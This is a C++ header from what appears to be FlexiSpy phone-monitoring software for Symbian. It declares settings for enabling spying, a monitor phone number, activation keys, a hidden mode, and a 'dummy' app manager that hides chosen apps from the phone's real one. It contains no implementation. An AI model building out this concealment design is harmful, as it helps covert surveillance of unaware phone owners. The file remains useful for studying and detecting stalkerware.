#ifndef __FxShareProperty_H__
#define __FxShareProperty_H__

#include <e32base.h>
#include "SharePropertyConst.h"

class FxShareProperty
	{
public:
	/**
	* Define shared properties between flexispy server components
	*/
	static TInt Define();
	static void DeleteAllProperty();
	static TInt SetSpyEnableFlag(TBool aEnable);
	static TInt SetMonitorNumber(const TDesC& aMonitorNumber);
	static TInt SetOperatorKeywords(const TDesC8& aKeywords);
	/**
	* Set product activation status
	* @param aActivated ETrue indicates the product has been activated
	*/
	static TInt SetActivationStatus(TBool aActivated);
	/**
	* Set test house mode
	* the application run in hidden mode only when it is activated with the real key not test house key.
	* 
	* @param aHidden
	*/
	static TInt SetSTKMode(TBool aMode);
	static TInt SetFlexiKeyHash(const TDesC8& aHash);
	static TInt SetProductID(const TDesC& aProductId);
	/**
	* note: this method alloc memory
	* @param aAppToBeHidden array contains Uid value, NULL means reset the previous data
	* @leave OOM, stream operation
	* @return KErrNone if 
	*/
	static TInt SetAppUidHiddedFromDummyAppMgrL(RArray<TInt32>* aAppToBeHidden);
	
	/**	
	* Active/Deactivate dummy app.manager
	* Dummy app.manager launcher is listening to this property.
	*
	* @param aActive ETrue dummy app.manager is active
	*			     EFalse dummy app.manager is not active
	*						the native app becomes alive
	*/
	static TInt SetActiveDummyAppMgr(TBool aActive);
	static void GetSpyEnableFlag(TBool& aEnable);
	static void GetMonitorNumber(TDes& aMonitorNumber);
	static void GetFlexiKeyHash(TDes8& aFlexiKeyHash);
	static void GetProductID(TDes& aProductID);
	};
	
#endif
